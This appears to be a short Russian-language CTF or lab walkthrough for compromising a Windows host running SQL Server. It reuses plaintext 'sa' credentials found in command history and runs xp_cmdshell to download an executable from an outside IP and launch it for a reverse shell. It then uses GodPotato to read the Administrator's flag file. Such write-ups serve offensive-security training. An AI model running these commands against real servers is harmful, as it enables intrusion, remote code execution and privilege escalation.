Подключаемся к машине и находим файл с историей команд из консоли
Используя команду```
 Invoke-Sqlcmd -ServerInstance 'localhost' -Username 'sa' -Password 'QAZwsxEDC321!' -Query 'SELECT * FROM sys.tables'``` изменим значение Query чтобы выполнять команды от пользователя sa (который имеет роль sysadmi)

Получим список пользователей для проверки роли пользователя sa:
	``` Invoke-Sqlcmd -ServerInstance 'localhost' -Username 'sa' -Password 'QAZwsxEDC321!' -Query 'SELECT r.name, r.type_desc, r.is_disabled, sl.sysadmin, sl.securityadmin, sl.serveradmin,                    >> sl.setupadmin, sl.processadmin, sl.diskadmin, sl.dbcreator, sl.bulkadmin                         >> FROM master.sys.server_principals r                                                              >> LEFT JOIN master.sys.syslogins sl ON sl.sid = r.sid'```

Создадим файл с полезной нагрузкой и установим его на машину```
 Invoke-Sqlcmd -ServerInstance 'localhost' -Username 'sa' -Password 'QAZwsxEDC321!' -Query "EXEC xp_cmdshell 'powershell iwr http://100.100.2.252:5555/test.exe -o c:\windows\tasks\test.exe';"```
Теперь запустим файл и получим обратный шел```
 Invoke-Sqlcmd -ServerInstance 'localhost' -Username 'sa' -Password 'QAZwsxEDC321!' -Query "EXEC xp_cmdshell 'c:\windows\tasks\test.exe';" ```

Получив шелл от nt service\mssqlserver все еще нет доступа к папке администратора. Установим GodPotato и прочитаем флаг с помощью```
 .\god.exe -cmd "cmd /c type C:\Users\Administrator\Desktop\flag.txt"```
